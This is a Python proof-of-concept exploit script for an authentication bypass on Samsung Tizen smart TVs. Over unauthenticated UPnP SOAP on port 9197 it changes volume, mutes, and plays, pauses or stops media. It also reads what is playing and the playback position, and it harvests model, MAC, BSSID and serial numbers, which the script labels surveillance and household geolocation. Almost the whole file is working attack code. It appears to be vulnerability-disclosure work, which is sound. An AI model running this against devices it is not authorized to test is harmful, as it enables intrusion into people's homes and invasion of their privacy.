#!/usr/bin/env python3
"""
PoC: Samsung Tizen Smart TV — Authentication Bypass

Demonstrates unauthenticated UPnP control (volume, media, surveillance)
bypassing WebSocket pairing gate on port 8001 via port 9197.

Usage: python3 poc.py --ip <SAMSUNG_IP> --scan

Tested: Samsung AU8000 (UN65AU8000FXZA), Tizen Y2021
Author: NSM Barii
"""



import sys, argparse, requests

# UI IMPORTS
from rich.console import Console


# CONSTANTS
console = Console()

PORT      = 9197
PORT_REST = 8001
PORT_DIAL = 7678

URL_RENDER = "/upnp/control/RenderingControl1"
URL_AVT    = "/upnp/control/AVTransport1"
NS_RENDER  = "urn:schemas-upnp-org:service:RenderingControl:1"
NS_AVT     = "urn:schemas-upnp-org:service:AVTransport:1"


COMMANDS = {
    "vol-get":    ("render", "GetVolume",        "<InstanceID>0</InstanceID><Channel>Master</Channel>"),
    "vol-set":    ("render", "SetVolume",        "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>{val}</DesiredVolume>"),
    "mute":       ("render", "SetMute",          "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredMute>1</DesiredMute>"),
    "unmute":     ("render", "SetMute",          "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredMute>0</DesiredMute>"),
    "mute-get":   ("render", "GetMute",          "<InstanceID>0</InstanceID><Channel>Master</Channel>"),
    "play":       ("avt",    "Play",             "<InstanceID>0</InstanceID><Speed>1</Speed>"),
    "pause":      ("avt",    "Pause",            "<InstanceID>0</InstanceID>"),
    "stop":       ("avt",    "Stop",             "<InstanceID>0</InstanceID>"),
    "now":        ("avt",    "GetMediaInfo",     "<InstanceID>0</InstanceID>"),
    "position":   ("avt",    "GetPositionInfo",  "<InstanceID>0</InstanceID>"),
    "state":      ("avt",    "GetTransportInfo", "<InstanceID>0</InstanceID>"),
}



class Samsung():
    """This class will demonstrate Samsung TV authentication bypass"""


    @classmethod
    def _soap(cls, ip, path, ns, action, body):
        """This method will send a UPnP SOAP request to the TV"""


        envelope = (
            f'<?xml version="1.0"?>'
            f'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            f's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
            f'<s:Body><u:{action} xmlns:u="{ns}">{body}</u:{action}></s:Body>'
            f'</s:Envelope>'
        )

        response = requests.post(f"http://{ip}:{PORT}{path}", timeout=5, headers={
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPAction":   f'"{ns}#{action}"',
        }, data=envelope)


        status_code = response.status_code
        text        = response.text


        return status_code, text


    @classmethod
    def _tag(cls, text, name):
        """this method will a value out of XML tags"""

        try: return text.split(f"<{name}>")[1].split(f"</{name}>")[0]
        except: return ""


    @classmethod
    def _query(cls, ip, command, val=None, verbose=True):
        """This method will be responsible for routing a command through the right UPnP service"""


        if command not in COMMANDS:
            console.print(f"[bold red][!] Unknown command: {command}")
            return None, None

        service, action, body = COMMANDS[command]

        if "{val}" in body:
            if val is None:
                console.print(f"[bold red][!] {command} requires a value (use -v)")
                return None, None
            body = body.replace("{val}", str(val))

        path = URL_RENDER if service == "render" else URL_AVT
        ns   = NS_RENDER  if service == "render" else NS_AVT

        code, resp = cls._soap(ip, path, ns, action, body)

        if verbose: console.print(f"[bold green][+] {action} [yellow] status_code: {code}")

        return code, resp


    # ── AUDIT CHECKS ── // THE BELOW IS PURELY FOR POC THAT THIS IS INDEED A VULNERABILITY OF WHICH SHOULD BE LOOKED INTO

    @classmethod
    def _check_auth_bypass(cls, ip):
        """Finding 1: Read volume, change it, restore it — all without auth"""


        console.print(f"\n[bold cyan][*] Auth Bypass (port {PORT}, no auth):")

        code, resp = cls._query(ip, "vol-get", verbose=False)

        if code != 200:
            console.print(f"[bold red]    GetVolume: FAILED ({code}) — TV may be off")
            return False

        vol  = cls._tag(resp, "CurrentVolume")
        test = "5" if vol != "5" else "10"

        console.print(f"[bold yellow]    Current volume: {vol}")

        code, _ = cls._query(ip, "vol-set", val=test, verbose=False)

        if code == 200:
            console.print(f"[bold red]    Set volume to {test}: SUCCESS — NO AUTH REQUIRED")
        else:
            console.print(f"[bold red]    SetVolume: FAILED ({code})")
            return False

        cls._query(ip, "vol-set", val=vol, verbose=False)
        console.print(f"[bold yellow]    Restored to {vol}")

        return True


    @classmethod
    def _check_surveillance(cls, ip):
        """Finding 2: Read what's currently playing — without auth"""


        console.print(f"\n[bold cyan][*] Surveillance (port {PORT}, no auth):")

        code, resp = cls._query(ip, "now", verbose=False)

        if code == 200:
            uri = cls._tag(resp, "CurrentURI")
            console.print(f"[bold yellow]    Currently playing: {uri or '(nothing)'}")
        else:
            console.print(f"[bold red]    GetMediaInfo: FAILED ({code})")

        code, resp = cls._query(ip, "position", verbose=False)

        if code == 200:
            pos = cls._tag(resp, "RelTime")
            dur = cls._tag(resp, "TrackDuration")
            console.print(f"[bold yellow]    Position: {pos} / {dur}")


    @classmethod
    def _check_info_disclosure(cls, ip):
        """Finding 3: Device info, BSSID, serials — all without auth"""


        console.print(f"\n[bold cyan][*] Info Disclosure (ports {PORT_REST}, {PORT_DIAL}, {PORT}, no auth):")

        try:
            data = requests.get(f"http://{ip}:{PORT_REST}/api/v2/", timeout=5).json().get("device", {})

            console.print(
                f"[bold yellow]    Model:  {data.get('modelName', '?')}\n"
                f"[bold yellow]    MAC:    {data.get('wifiMac', '?')}\n"
                f"[bold red]    BSSID:  {data.get('ssid', '?')}  (GEOLOCATION VECTOR)\n"
                f"[bold yellow]    UUID:   {data.get('id', '?')}\n"
                f"[bold yellow]    OS:     {data.get('OS', '?')}"
            )


        except Exception as e: console.print(f"[bold red]    REST API not reachable: {e}")

        try:

            resp = requests.get(f"http://{ip}:{PORT_DIAL}/nservice/DDBridge/description.xml", timeout=5)
            console.print(f"[bold yellow]    Serial #1: {cls._tag(resp.text, 'serialNumber')}")

        except: pass

        try:

            resp = requests.get(f"http://{ip}:{PORT}/dmr", timeout=5)
            console.print(f"[bold yellow]    Serial #2: {cls._tag(resp.text, 'serialNumber')}")

        except: pass


    @classmethod
    def _scan(cls, ip):
        """Run the full bypass audit"""

        console.print(f"\n[bold green][*] Target:[yellow] {ip}:{PORT}")
        console.print(f"[bold green][*] Running auth bypass audit\n")

        cls._check_auth_bypass(ip=ip)
        cls._check_surveillance(ip=ip)
        cls._check_info_disclosure(ip=ip)

        console.print(f"\n[bold cyan][*] RESULT: [bold red]Port {PORT} has zero auth. WebSocket pairing on 8001 is bypassed.")
        console.print(f"[bold red]    Attacker on LAN can: control volume, push media, surveil playback, geolocate household")



    @classmethod
    def main(cls):
        """This will spearhead this class"""


        parser = argparse.ArgumentParser(
            description="PoC for Samsung TV auth bypass — unauthenticated UPnP control",
            add_help=True)


        parser.add_argument("--ip", help="Target Samsung TV IP")
        parser.add_argument("--scan", action="store_true", help="Run full bypass audit")
        parser.add_argument("--auth-bypass", action="store_true", help="Demo auth bypass only")
        parser.add_argument("--surveillance", action="store_true", help="Demo surveillance only")
        parser.add_argument("--info", action="store_true", help="Demo info disclosure only")
        parser.add_argument("-k", help=f"Send a command. Options: {list(COMMANDS.keys())}")
        parser.add_argument("-v", help="Value to pass with -k (e.g. volume level)")
        parser.add_argument("--commands", action="store_true", help="List all available commands")


        args = parser.parse_args()



        # DIFFERENT APPROACH THEN MY ROKU POC, AS WITH SAMSUNG I HAVE TO QUERY USING HTML INSTEAD OF REGULAR REQUESTS
        key      = args.k
        val      = args.v
        commands = args.commands


        if commands: console.print(f"[bold green][+] Commands:[yellow] {list(COMMANDS.keys())}"); sys.exit()

        if not args.ip: console.print(f"[bold red][!] Samsung TV IP needed and not given!"); sys.exit()


        ip = args.ip

        if args.scan: cls._scan(ip=ip); sys.exit()
        if args.auth_bypass: cls._check_auth_bypass(ip=ip); sys.exit()
        if args.surveillance: cls._check_surveillance(ip=ip); sys.exit()
        if args.info: cls._check_info_disclosure(ip=ip); sys.exit()

        if not key: console.print(f"[bold red][!] Command needed! Use --commands to see options"); sys.exit()
        if key and key not in COMMANDS: console.print(f"[bold red][!] Command given doesnt match available commands... exiting!"); sys.exit()

        cls._query(ip=ip, command=key, val=val)


if __name__ == "__main__":
    Samsung.main()
